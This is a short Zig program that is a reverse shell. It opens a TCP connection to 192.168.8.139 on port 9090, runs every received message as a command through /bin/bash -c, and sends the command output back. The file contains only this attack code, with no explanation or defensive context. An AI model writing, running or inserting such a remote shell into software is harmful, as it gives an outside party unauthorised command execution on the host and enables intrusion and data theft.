const std = @import("std");
const network = @import("network");

pub fn main() !void {

try network.init();
   defer network.deinit();

   const sock = try network.connectToHost(std.heap.page_allocator, "192.168.8.139", 9090, .tcp);
   defer sock.close();

   const allocator = std.testing.allocator;
   const cwd = null;

   while (true) {
      var buf: [1024]u8 = undefined;
      const amt = try sock.receive(&buf);
      if (amt == 0)
         break;
      const msg = buf[0..amt];
      const result = try std.ChildProcess.exec(.{
        .allocator = allocator,
        .argv = &[_][]const u8{"/bin/bash", "-c", msg},
        .cwd_dir = cwd,
      });
      try sock.writer().writeAll(result.stdout);
      try sock.writer().writeAll(result.stderr);
   }
}
